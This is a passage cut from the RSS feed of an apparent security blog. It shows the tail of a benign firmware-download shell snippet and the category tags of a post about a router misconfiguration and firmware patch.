class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download succeeded&quot;</span>     fi       TAR=<span class="hljs-variable">$filename</span> &#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/router/">router</category>
      
      <category domain="https://hackyboiz.github.io/tags/misconfiguration/">misconfiguration</category>
      
      <category domain="https://hackyboiz.github.io/tags/firmware-patch/">firmware patch</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/26/fabu1ous/2021-05-26/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
